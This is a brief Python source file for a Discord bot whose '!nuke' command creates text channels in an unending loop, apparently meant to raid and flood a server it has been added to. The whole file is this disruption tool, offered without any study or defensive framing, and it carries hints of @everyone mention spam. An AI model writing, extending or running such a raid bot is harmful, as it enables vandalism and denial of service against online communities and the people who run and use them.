token = "YourTokenHere"
import discord
from discord.ext import commands
from discord.utils import get

bot = commands.Bot(command_prefix="!", case_insensitive=True, help_command=None)

@bot.command()
async def nuke(ctx, arg: str):
    allow_mentions = discord.AllowedMentions(everyone = True)
    guild = ctx.message.guild # !nuke ez
    while True:
        channels = await guild.create_text_channel(arg)
         